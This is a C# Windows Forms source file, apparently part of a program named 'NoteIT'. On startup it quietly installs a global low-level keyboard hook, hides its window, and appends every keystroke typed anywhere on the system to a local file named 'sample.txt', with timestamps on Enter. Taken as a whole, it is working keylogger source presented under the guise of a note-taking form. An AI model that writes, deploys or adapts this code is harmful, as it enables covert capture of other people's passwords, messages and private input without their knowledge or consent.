using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NoteIT
{
    public partial class Subform : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public Subform()
        {
            var handle = GetConsoleWindow();
            _hookID = SetHook(_proc);
            //UnhookWindowsHookEx(_hookID);
            InitializeComponent();
            this.Visible = false;
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                Debug.WriteLine("here");
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
            
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "Space")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(" ");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    //sw.Write("\n");
                    DateTime time = DateTime.Now;
                    sw.Write("\n" + (time.ToString("MMM ddd d HH:mm yyyy")) + "\n");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Back")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("~bksp~");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(".");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(",");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemQuestion")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("?");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemtilde")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("`");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Add")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("+");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Subtract")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("-");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Multiply")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("*");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Divide")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("/");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "RControlKey")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("ctrl");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "LControlKey")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("ctrl");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "LShiftKey")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(" shift ");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "RShiftKey")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(" shift ");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "Decimal")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(".");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("0");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("1");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("2");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("3");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("4");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("5");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("6");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("7");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("8");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("9");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("0");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad1")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("1");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad2")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("2");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad3")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("3");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad4")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("4");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad5")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("5");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad6")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("6");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad7")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("7");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad8")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("8");
                    sw.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad9")
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write("9");
                    sw.Close();
                }
                else
                {
                    //Console.WriteLine((Keys)vkCode);
                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
                    sw.Write(((Keys)vkCode).ToString());
                    sw.Close();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 1;




    }
}
